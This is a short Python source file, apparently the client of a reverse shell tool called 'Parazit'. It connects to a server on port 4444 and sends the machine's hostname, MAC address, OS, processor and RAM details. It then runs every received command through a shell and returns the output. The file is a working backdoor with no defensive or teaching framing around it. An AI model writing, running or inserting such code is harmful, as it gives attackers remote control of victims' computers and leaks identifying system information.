import platform
import psutil
import re
import socket
import subprocess
import uuid

CLIENT_HOSTNAME = socket.gethostname()
CLIENT_MAC_ADDRESS = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
SERVER_HOST = '127.0.0.1'
PORT = 4444
BANNER = F"""
  _____                    _ _   
 |  __ \                  (_| |  
 | |__) __ _ _ __ __ _ _____| |_ 
 |  ___/ _` | '__/ _` |_  | | __|
 | |  | (_| | | | (_| |/ /| | |_ 
 |_|   \__,_|_|  \__,_/___|_|\__|
                    Powered by 4MLabs      

CONNECTION FROM {CLIENT_HOSTNAME}

[+] IP: {socket.gethostbyname('localhost')}
[+] MAC ADDRESS: {CLIENT_MAC_ADDRESS}
[+] MACHINE: {platform.machine()}
[+] VERSION: {platform.version()}
[+] RELEASE: {platform.release()}
[+] PLATFORM: {platform.platform()}
[+] SYSTEM: {platform.system()}
[+] PROCESSOR: {platform.processor()}
[+] RAM: {str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"}

"""

def _get_client_ip(conn):
    return conn.gethostbyname(socket.gethostname())

def _send_system_info_to_server(conn):
    conn.send(bytes(BANNER, encoding='iso-8859-1'))

def start_client():
    # create connection
    conn = socket.socket()
    conn.connect((SERVER_HOST, PORT))

    # send system info
    _send_system_info_to_server(conn)

    while True:
        cmd = conn.recv(1024)
        cmd = cmd.decode()
        process = subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        output = process.stdout.read()
        output_error = process.stderr.read()
        conn.send(output + output_error)

if __name__ == "__main__":
    start_client()